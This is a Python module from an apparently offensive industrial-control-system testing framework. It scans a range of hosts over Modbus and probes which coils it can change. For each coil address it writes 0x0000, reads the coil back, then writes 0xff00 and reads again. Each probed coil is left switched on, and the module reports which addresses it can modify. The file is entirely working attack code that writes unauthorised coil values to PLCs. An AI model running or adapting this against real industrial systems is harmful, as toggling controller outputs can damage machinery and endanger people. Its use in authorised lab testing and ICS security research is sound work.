import os
import threading
from time import sleep
from System.Core.Global import *
from System.Core.Colors import *
from System.Core.Modbus import *
from System.Lib import ipcalc

down = False


class Module:
    info = {
        "Name": "Query Modifiable Coils",
        "Author": ["maqi"],
        "Description": "Query Modifiable Coils",
    }
    ## 目前测试阶段，指定我们的IP和端口，由于我们需要查询所有可修改的数据，因此在这里我们遍历所有地址空间
    options = {
        "RHOSTS": [
            "192.168.233.74",
            True,
            "The target address range or CIDR identifier",
        ],
        "RPORT": [21502, False, "The port number for modbus protocol"],
        "UID": ["1", True, "Modbus Slave UID."],
        "Quantity": ["0x0001", True, "Registers Values."],
        "Threads": [1, False, "The number of concurrent threads"],
        "Output": [True, False, "The stdout save in output directory"],
        # "WriteValue": ["0xff00", True, "Write in the coils"]
    }
    output = ""
    address = []

    def exploit(self):
        moduleName = self.info["Name"]
        print(
            bcolors.OKBLUE + "[+]" + bcolors.ENDC + " Module " + moduleName + " Start"
        )
        ips = list()
        for ip in ipcalc.Network(self.options["RHOSTS"][0]):
            ips.append(str(ip))
        while ips:
            for i in range(int(self.options["Threads"][0])):
                if len(ips) > 0:
                    thread = threading.Thread(target=self.do, args=(ips.pop(0),))
                    thread.start()
                    THREADS.append(thread)
                else:
                    break
            for thread in THREADS:
                thread.join()
        if self.options["Output"][0]:
            open(
                mainPath
                + "/Output/"
                + moduleName
                + "_"
                + self.options["RHOSTS"][0].replace("/", "_")
                + ".txt",
                "a",
            ).write("=" * 30 + "\n" + self.output + "\n\n")
        self.output = ""

    def printLine(self, str, color):
        self.output += str + "\n"
        if str.find("[+]") != -1:
            print(str.replace("[+]", color + "[+]" + bcolors.ENDC))
        elif str.find("[-]") != -1:
            print(str.replace("[-]", color + "[+]" + bcolors.ENDC))
        else:
            print(str)

    def do(self, ip):
        c = connectToTarget(ip, self.options["RPORT"][0])
        if c is None:
            self.printLine("[-] Modbus is not running on : " + ip, bcolors.WARNING)
            return None
        self.printLine("[+] Connecting to " + ip, bcolors.OKGREEN)
        for i in range(0x0000, 0x0050, int(self.options["Quantity"][0], 16)):
            print(f"Address {hex(i)} ".center(20, "#"))
            # 先写入0x0000
            ans = c.sr1(
                ModbusADU(transId=getTransId(), unitId=int(self.options["UID"][0]))
                / ModbusPDU05_Write_Single_Coil(
                    outputAddr=int(hex(i), 16),
                    outputValue=int("0x0000", 16),
                ),
                timeout=timeout,
                verbose=0,
            )
            sleep(0.2)
            # 再读取写入的值
            ans = c.sr1(
                ModbusADU(transId=getTransId(), unitId=int(self.options["UID"][0]))
                / ModbusPDU01_Read_Coils(
                    startAddr=int(hex(i), 16),
                    quantity=int(self.options["Quantity"][0], 16),
                ),
                timeout=timeout,
                verbose=0,
            )
            ans = ModbusADU_Answer(bytes(ans))
            s = bytes(ans)[9:]
            s = ''.join([bin(int(hex(i), 16))[2:].zfill(8)[::-1] for i in s])
            print(f"read first:{s[0]}")
            ## 保存读到的线圈值
            read_1 = 1 if s[0] == '0' else 0
            # 写入0xff00
            ans = c.sr1(
                ModbusADU(transId=getTransId(), unitId=int(self.options["UID"][0]))
                / ModbusPDU05_Write_Single_Coil(
                    outputAddr=int(hex(i), 16),
                    outputValue=int("0xff00", 16),
                ),
                timeout=timeout,
                verbose=0,
            )
            sleep(0.2)
            # 第二次读线圈值，与我们写入的值比较
            ans = c.sr1(
                ModbusADU(transId=getTransId(), unitId=int(self.options["UID"][0]))
                / ModbusPDU01_Read_Coils(
                    startAddr=int(hex(i), 16),
                    quantity=int(self.options["Quantity"][0], 16),
                ),
                timeout=timeout,
                verbose=0,
            )
            ans = ModbusADU_Answer(bytes(ans))
            s = bytes(ans)[9:]
            s = ''.join([bin(int(hex(i), 16))[2:].zfill(8)[::-1] for i in s])
            print(f"read second:{s[0]}")
            ## 保存读到的线圈值
            read_2 = 1 if s[0] == '1' else 0
            if read_1 + read_2 == 2:
                print(f"{hex(i)} address can be modifiable!")
                self.address.append(hex(i))
        print(self.address)
        self.address.clear()
